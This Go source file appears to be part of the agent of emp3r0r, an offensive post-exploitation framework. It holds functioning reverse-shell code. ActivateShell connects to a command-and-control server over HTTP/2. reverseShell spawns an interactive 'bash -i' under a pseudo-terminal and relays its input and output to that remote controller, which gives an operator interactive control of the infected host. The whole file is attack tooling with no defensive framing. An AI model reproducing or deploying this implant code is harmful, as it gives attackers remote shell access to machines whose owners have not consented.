package agent

import (
	"log"
	"os/exec"
	"strings"

	"github.com/creack/pty"
	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
	"github.com/posener/h2conn"
)

// ActivateShell launch reverse shell and send it to CC
func ActivateShell() {
	var (
		err       error
		streamURL = CCAddress + tun.StreamAPI

		conn *h2conn.Conn // reverse shell uses this connection
		exit = false      // when to exit
	)

	conn, _, _, err = ConnectCC(streamURL)
	defer func() {
		err = conn.Close()
		if err != nil {
			log.Print("Closing reverseBash connection: ", err)
		}
	}()

	go reverseShell(SendCC, RecvCC)

	go func() {
		for {
			data := make([]byte, BufSize)
			_, err = conn.Read(data)
			if err != nil {
				log.Print("Read remote: ", err)
				exit = true
				return
			}
			RecvCC <- data
		}
	}()

	for outgoing := range SendCC {
		if exit {
			return
		}
		_, err = conn.Write(outgoing)
		if err != nil {
			log.Print("Send to remote: ", err)
			exit = true
		}
	}
}

// reverseShell - Execute a reverse shell to host
func reverseShell(send chan<- []byte, recv <-chan []byte) {
	cmd := exec.Command("bash", "-i")
	exit := false

	shellf, err := pty.Start(cmd)
	if err != nil {
		log.Print("start bash: ", err)
		return
	}

	go func() {
		for incoming := range recv {
			if strings.Contains(string(incoming), "exit\n") {
				exit = true
			}
			_, err := shellf.Write(incoming)
			if err != nil {
				log.Print("shell write stdin: ", err)
			}
		}
	}()

	go func() {
		for {
			buf := make([]byte, BufSize)
			_, _ = shellf.Read(buf)
			send <- buf
		}
	}()

	for {
		if exit {
			_ = cmd.Process.Kill()
			return
		}
		buf := make([]byte, BufSize)
		_, _ = shellf.Read(buf)
		send <- buf
	}
}
